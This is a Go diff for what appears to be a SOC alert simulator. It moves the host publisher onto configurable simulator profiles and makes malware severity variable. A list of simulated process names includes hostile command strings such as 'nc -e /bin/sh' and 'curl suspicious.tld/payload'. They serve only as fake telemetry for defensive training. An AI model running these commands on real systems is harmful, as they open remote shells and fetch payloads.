@@ -4,13 +4,12 @@ import (
 	"context"
 	"fmt"
 	"log"
-	"math/rand"
 
 	"soc-mqtt-simulator/backend/models"
 	socmqtt "soc-mqtt-simulator/backend/mqtt"
 )
 
-func StartHost(ctx context.Context, brokerURL string) error {
+func StartHost(ctx context.Context, brokerURL string, sim *Simulator) error {
 	agent := Agent{
 		Name:        "host",
 		ClientID:    "publisher-host-agent",
@@ -27,10 +26,10 @@ func StartHost(ctx context.Context, brokerURL string) error {
 		log.Printf("[publisher:host] started")
 		hosts := []string{"server-01", "server-02", "workstation-01"}
 		processes := []string{"nc -e /bin/sh", "curl suspicious.tld/payload", "powershell encoded command", "miner-daemon"}
-
-		for randomInterval(ctx, 2, 4) {
-			host := hosts[rand.Intn(len(hosts))]
-			if rand.Intn(100) < 55 {
+		profile := sim.Profile()
+		for sim.Delay(ctx, 2, 4) {
+			host := hosts[randIntn(len(hosts))]
+			if sim.Chance(profile.AuthBurstChance) {
 				publishEvent(client, fmt.Sprintf(socmqtt.TopicHostAuthPattern, host), socmqtt.QoSAtLeastOnce, false, EventPayload{
 					Type:        models.BruteForce,
 					Severity:    models.Medium,
@@ -44,16 +43,20 @@ func StartHost(ctx context.Context, brokerURL string) error {
 				continue
 			}
 
+			severity := models.High
+			if !sim.Chance(profile.MalwareChance) {
+				severity = models.Medium
+			}
 			publishEvent(client, fmt.Sprintf(socmqtt.TopicHostProcessPattern, host), socmqtt.QoSAtMostOnce, false, EventPayload{
 				Type:        models.Malware,
-				Severity:    models.High,
+				Severity:    severity,
 				SourceIP:    randomPrivateIP(),
 				DestIP:      randomIP(),
 				Port:        randomPort(),
 				Description: "Suspicious process execution detected",
 				Agent:       "host",
 				Hostname:    host,
-				Process:     processes[rand.Intn(len(processes))],
+				Process:     processes[randIntn(len(processes))],
 			})
 		}
 	}()
